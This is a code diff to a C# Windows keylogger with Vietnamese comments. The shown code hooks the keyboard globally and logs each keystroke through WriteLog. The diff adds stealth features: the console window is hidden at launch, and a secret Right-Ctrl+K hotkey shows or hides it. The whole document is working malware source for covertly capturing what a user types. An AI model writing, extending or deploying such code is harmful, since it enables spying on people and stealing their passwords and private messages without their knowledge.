@@ -80,7 +80,7 @@ namespace KeyLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-
+                CheckHotkey(vkCode);
                 WriteLog(vkCode);
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -100,8 +100,7 @@ namespace KeyLogger
         }
 
         /// <summary>
-        /// Chạy việc bắt phím đc nhập vào
-        /// và ẩn keylogger
+        /// Chạy việc bắt phím đc nhập vào và ẩn keylogger
         /// Keylogger chỉ hiển thị lại nếu nhấn phải phím tắt của windows
         /// </summary>
         static void HookKeyboard()
@@ -109,6 +108,35 @@ namespace KeyLogger
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
+        }
+        #endregion
+
+        #region Thiết lập phiết tắt
+        /// <summary>
+        /// Xử lí sự kiện ban đầu
+        /// Cài đặt tổ hợp phím tắt
+        /// </summary>
+        static bool isHotkey = false;
+        static bool isShowing = false;
+        static Keys previousKey = Keys.Separator;
+
+        static void CheckHotkey(int vkCode)
+        {
+            if (previousKey == Keys.RControlKey && (Keys)(vkCode) == Keys.K)
+                isHotkey = true;
+
+            if(isHotkey)
+            {
+                if(!isShowing)
+                    DisplayWindow();
+                else
+                HideWindow();
+
+                isShowing = !isShowing;
+            }
+
+            previousKey = (Keys)vkCode;
+            isHotkey = false;
         }
         #endregion              
 
@@ -190,8 +218,36 @@ namespace KeyLogger
             thread.Start();
         }
         #endregion
+
+        #region Cài đặt hiển thị cửa sổ
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // Ẩn cửa sổ
+        const int SW_HIDE = 0;
+
+        // Hiện cửa sổ
+        const int SW_SHOW = 5;
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion
+
         static void Main(string[] args)
         {
+            HideWindow();
             StrartTimer();
             HookKeyboard();
         }
